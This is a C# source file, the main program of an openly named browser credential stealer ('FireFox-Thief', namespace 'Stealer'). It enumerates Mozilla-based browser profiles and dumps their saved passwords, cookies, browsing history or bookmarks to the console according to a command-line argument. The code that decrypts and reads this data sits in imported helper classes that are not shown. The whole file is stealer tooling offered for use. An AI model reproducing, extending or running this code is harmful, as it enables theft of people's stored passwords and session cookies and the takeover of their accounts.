/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using Stealer.Reader;
using Stealer.Helpers;
using static Stealer.Helpers.Common;
using System.IO;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            // Get command line args
            string arguments = string.Join(" ", args).ToLower();
            if (string.IsNullOrEmpty(arguments))
            {
                Console.WriteLine("Stealer.exe passwords/cookies/history/bookmarks\nCoded by LimerBoy\nGithub: github.com/LimerBoy/FireFox-Thief");
                Environment.Exit(1);
            }

            foreach (string browser in Profile.GetMozillaBrowsers())
            {
                // Show info
                Console.WriteLine("Reading " + arguments + " from " + new DirectoryInfo(browser).Name + " browser.");

                // Get cookies
                if (arguments.Equals("cookies"))
                {
                    foreach (Cookie cookie in Cookies.Get(browser))
                    {
                        Console.WriteLine(BrowserUtils.FormatCookie(cookie));
                    }
                }
                // Get history
                if (arguments.Equals("history"))
                {
                    foreach (Site history in History.Get(browser))
                    {
                        Console.WriteLine(BrowserUtils.FormatHistory(history));
                    }
                }
                // Get bookmarks
                if (arguments.Equals("bookmarks"))
                {
                    foreach (Bookmark bookmark in Bookmarks.Get(browser))
                    {
                        Console.WriteLine(BrowserUtils.FormatBookmark(bookmark));
                    }
                }
                // Get passwords
                if (arguments.Equals("passwords"))
                {
                    foreach (Password account in Passwords.Get(browser))
                    {
                        Console.WriteLine(BrowserUtils.FormatPassword(account));
                    }
                }
            }

            Console.WriteLine("DONE");
        }
    }
}
